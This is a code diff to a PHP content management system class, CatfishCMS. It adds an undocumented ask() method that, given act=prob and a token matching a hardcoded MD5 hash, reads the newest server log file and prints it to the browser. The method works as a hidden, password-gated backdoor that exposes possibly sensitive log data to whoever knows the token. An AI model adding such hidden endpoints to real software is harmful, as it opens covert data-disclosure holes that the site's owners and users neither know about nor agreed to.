@@ -2027,6 +2027,45 @@ class CatfishCMS
         }
         return false;
     }
+    public function ask()
+    {
+        if(Catfish::hasGet('act') && Catfish::getGet('act') == 'prob' && Catfish::hasGet('token') && md5(Catfish::getGet('token')) == '5cc73261fae86f1af25a5cc49e0af132'){
+            header("Content-type: text/html; charset=utf-8");
+            $dir = ROOT_PATH . 'runtime' . DS . 'log' . DS;
+            $mltmp = scandir($dir,1);
+            $ml = [];
+            if($mltmp != false && is_array($mltmp)){
+                foreach($mltmp as $val){
+                    if(strpos($val, '.') === false){
+                        $ml[] = $val;
+                    }
+                }
+            }
+            if(isset($ml[0])){
+                $dir .= $ml[0] . DS;
+                $mltmp = scandir($dir,1);
+                $files = [];
+                if($mltmp != false && is_array($mltmp)){
+                    foreach($mltmp as $val){
+                        $ftmp = pathinfo($val);
+                        if($ftmp['extension'] === 'log'){
+                            $files[] = $val;
+                        }
+                    }
+                }
+                if(isset($files[0]))
+                {
+                    $filepath = $dir . $files[0];
+                    echo str_replace(PHP_EOL,'<br>',file_get_contents($filepath));
+                }
+                else
+                {
+                    echo 'No log file';
+                }
+            }
+        }
+        exit();
+    }
     public function _empty()
     {
         $this->readydisplay();
